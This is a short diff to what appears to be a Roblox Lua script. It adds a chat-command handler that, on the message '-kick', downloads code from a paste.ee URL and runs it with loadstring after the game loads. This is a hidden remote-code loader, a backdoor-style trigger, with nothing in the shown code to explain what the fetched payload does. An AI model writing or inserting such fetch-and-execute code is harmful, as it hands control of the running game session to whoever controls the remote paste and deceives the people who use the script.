@@ -821,6 +821,12 @@ end
 		--end)
 
 end
-end)
+
 
 -------------
+
+
+if msg:lower():sub(1,8) == "-kick" then
+repeat wait() until game:IsLoaded() wait(0.05) loadstring(game:HttpGet("https://paste.ee/r/38EzK"))() warn("loaded")
+end
+end)
